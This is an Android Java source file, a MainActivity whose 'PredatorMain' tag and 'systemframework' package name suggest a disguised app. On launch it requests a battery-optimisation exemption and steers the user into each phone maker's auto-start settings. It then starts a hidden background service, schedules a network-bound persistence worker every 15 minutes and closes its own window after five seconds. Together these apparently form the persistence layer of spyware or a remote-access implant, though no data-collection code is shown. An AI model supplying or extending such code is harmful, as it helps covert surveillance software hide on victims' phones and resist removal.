package com.example.systemframework;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import java.util.concurrent.TimeUnit;

/**
 * MainActivity — Launches service, requests permissions, handles OEM auto-start
 * 
 * UNIVERSAL OEM SUPPORT:
 * - Xiaomi/Poco/Redmi (MIUI/HyperOS)
 * - Samsung (One UI)
 * - Oppo/Realme (ColorOS)
 * - Vivo (Funtouch/OriginOS)
 * - Huawei/Honor (EMUI/MagicUI)
 * - OnePlus (OxygenOS)
 * - Asus (ZenUI)
 * - Lenovo/Motorola (near-stock + battery)
 * - Nokia (EventStream)
 * - All other stock Android devices
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "PredatorMain";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ✅ 1. Request battery optimization exemption
        requestBatteryExemption();

        // ✅ 2. Open OEM-specific auto-start settings
        openOemAutoStart();

        // ✅ 3. Start the background service
        Intent serviceIntent = new Intent(this, MyBackgroundService.class);
        ContextCompat.startForegroundService(this, serviceIntent);

        // ✅ 4. Schedule WorkManager for bulletproof persistence
        scheduleWorkManager();

        // ✅ 5. Close app after 5 seconds
        new Handler().postDelayed(this::finish, 5000);
    }

    /**
     * Request battery optimization exemption (works on ALL Android 6+)
     */
    @SuppressLint("BatteryLife")
    private void requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            String packageName = getPackageName();

            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    startActivity(intent);
                    Log.d(TAG, "Battery optimization exemption requested");
                } catch (Exception e) {
                    Log.e(TAG, "Battery exemption failed: " + e.getMessage());
                }
            }
        }
    }

    /**
     * ✅ UNIVERSAL OEM AUTO-START HANDLER
     * 
     * Each OEM has a proprietary "auto-start" or "background management" setting
     * that BLOCKS apps from running in background EVEN with foreground service.
     * This opens the correct settings page for each manufacturer.
     */
    private void openOemAutoStart() {
        String manufacturer = Build.MANUFACTURER.toLowerCase();
        Log.d(TAG, "Detected OEM: " + manufacturer);

        Intent intent = null;

        try {
            switch (manufacturer) {
                // ═══════════════════════════════════════════
                // XIAOMI / POCO / REDMI (MIUI / HyperOS)
                // ═══════════════════════════════════════════
                case "xiaomi":
                case "poco":
                case "redmi":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    ));
                    Log.d(TAG, "Opening Xiaomi AutoStart manager");
                    break;

                // ═══════════════════════════════════════════
                // SAMSUNG (One UI)
                // ═══════════════════════════════════════════
                case "samsung":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.samsung.android.lool",
                        "com.samsung.android.sm.ui.battery.BatteryActivity"
                    ));
                    Log.d(TAG, "Opening Samsung battery manager");
                    break;

                // ═══════════════════════════════════════════
                // OPPO / REALME (ColorOS)
                // ═══════════════════════════════════════════
                case "oppo":
                case "realme":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    ));
                    Log.d(TAG, "Opening Oppo/Realme startup manager");
                    break;

                // ═══════════════════════════════════════════
                // VIVO (Funtouch / OriginOS)
                // ═══════════════════════════════════════════
                case "vivo":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    ));
                    Log.d(TAG, "Opening Vivo background startup manager");
                    break;

                // ═══════════════════════════════════════════
                // HUAWEI / HONOR (EMUI / MagicUI)
                // ═══════════════════════════════════════════
                case "huawei":
                case "honor":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    ));
                    Log.d(TAG, "Opening Huawei protected apps");
                    break;

                // ═══════════════════════════════════════════
                // ONEPLUS (OxygenOS)
                // ═══════════════════════════════════════════
                case "oneplus":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.oneplus.security",
                        "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                    ));
                    Log.d(TAG, "Opening OnePlus auto-launch manager");
                    break;

                // ═══════════════════════════════════════════
                // ASUS (ZenUI / ROG)
                // ═══════════════════════════════════════════
                case "asus":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.asus.mobilemanager",
                        "com.asus.mobilemanager.autostart.AutoStartActivity"
                    ));
                    Log.d(TAG, "Opening Asus auto-start manager");
                    break;

                // ═══════════════════════════════════════════
                // NOKIA (EventStream)
                // ═══════════════════════════════════════════
                case "nokia":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.evenwell.powersaving.g3",
                        "com.evenwell.powersaving.g3.exception.PowerSaverExceptionActivity"
                    ));
                    Log.d(TAG, "Opening Nokia power saver exception");
                    break;

                // ═══════════════════════════════════════════
                // LENOVO / MOTOROLA
                // ═══════════════════════════════════════════
                case "lenovo":
                case "motorola":
                    intent = new Intent();
                    intent.setComponent(new ComponentName(
                        "com.lenovo.powersetting",
                        "com.lenovo.powersetting.ui.Settings$HighPowerApplicationsActivity"
                    ));
                    Log.d(TAG, "Opening Lenovo/Moto power settings");
                    break;

                default:
                    Log.d(TAG, "Stock Android or unknown OEM — no special auto-start needed");
                    break;
            }

            // Try to open the OEM-specific intent
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }

        } catch (Exception e) {
            // OEM intent not found (probably different OS version) — try fallback
            Log.w(TAG, "OEM auto-start intent failed: " + e.getMessage());
            tryFallbackAutoStart(manufacturer);
        }
    }

    /**
     * Fallback: If the specific OEM intent fails (different ROM version),
     * try generic alternatives
     */
    private void tryFallbackAutoStart(String manufacturer) {
        try {
            // Fallback 1: Try generic Xiaomi security center
            if (manufacturer.equals("xiaomi") || manufacturer.equals("poco") || manufacturer.equals("redmi")) {
                Intent fallback = new Intent("miui.intent.action.OP_AUTO_START");
                fallback.addCategory(Intent.CATEGORY_DEFAULT);
                startActivity(fallback);
                Log.d(TAG, "Xiaomi fallback auto-start opened");
                return;
            }

            // Fallback 2: Try opening the app's own battery settings page
            Intent batteryIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            batteryIntent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(batteryIntent);
            Log.d(TAG, "Opened app details settings as fallback");

        } catch (Exception e2) {
            Log.e(TAG, "All auto-start fallbacks failed: " + e2.getMessage());
        }
    }

    /**
     * ✅ Schedule WorkManager — the ONLY reliable way to keep services alive
     * 
     * - Runs every 15 minutes (Android enforced minimum)
     * - Survives Doze mode, app standby, and ALL OEM battery killers
     * - KEEP_EXISTING: don't duplicate if already scheduled
     * - Requires network connectivity (no point reconnecting without internet)
     */
    private void scheduleWorkManager() {
        try {
            Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

            PeriodicWorkRequest persistenceWork = new PeriodicWorkRequest.Builder(
                    PersistenceWorker.class,
                    15, TimeUnit.MINUTES  // Android minimum
                )
                .setConstraints(constraints)
                .setInitialDelay(1, TimeUnit.MINUTES) // First run after 1 min
                .build();

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                PersistenceWorker.WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,  // Don't duplicate
                persistenceWork
            );

            Log.d(TAG, "✅ WorkManager scheduled — persistence guaranteed");
        } catch (Exception e) {
            Log.e(TAG, "WorkManager scheduling failed: " + e.getMessage());
        }
    }
}